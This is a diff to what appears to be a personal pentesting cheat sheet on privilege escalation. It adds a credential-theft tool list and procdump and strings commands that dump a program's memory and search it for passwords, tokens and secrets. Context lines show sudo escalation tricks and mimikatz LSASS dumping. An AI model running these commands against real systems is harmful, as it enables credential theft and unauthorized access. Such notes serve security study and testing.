@@ -1,5 +1,9 @@
 ==## 4 - PRIVESC ##==
 
+==TOOLS REFERENCE==
+fakelogonscreen
+lazagne
+
 --# misconfig systems - nix #--
 sudo -l #what access? if you have access to debuggers ex /usr/bin/gdb - sudo gdb && shell - it couldn't be that easy
 sudo su #it couldn't be that easy
@@ -37,3 +41,7 @@ NT hashes - D C F E D - 21d5cfe0d - indicates this is an empty NT hash - not act
 mk.exe
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonPasswords full
+
+#can also dump from 3rd party program that stores pw
+.\procdump.exe -accepteula -ma <program>.exe <dump>.dmp
+strings <dump>.dmp | grep -iE "auth|login|pass|key|secret|token|"
